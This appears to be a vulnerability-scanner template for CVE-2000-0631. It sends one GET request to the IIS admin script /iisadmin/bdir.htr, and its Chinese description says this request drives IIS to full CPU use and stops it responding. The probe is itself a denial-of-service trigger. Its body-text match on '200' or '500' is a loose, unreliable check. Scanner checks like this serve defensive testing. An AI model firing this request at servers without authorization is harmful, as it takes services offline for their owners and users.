[info]
author = "AVE"
description = "检测 Microsoft IIS 3.0/4.0/5.0 管理脚本因缺少目录浏览参数导致的拒绝服务漏洞。向 IIS 管理脚本发送缺少特定参数的 GET 请求，可导致 IIS 服务消耗全部 CPU 资源并停止响应。"
id = "POC-AVE-2000-0766"
name = "CVE-2000-0631 PoC"
severity = "medium"
tags = [
    "cve-2000-0631",
    "iis",
    "dos",
]
vuln_id = [
    "CVE-2000-0631",
    "AVE-2000-0766",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/iisadmin/bdir.htr"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "200",
    "500",
]
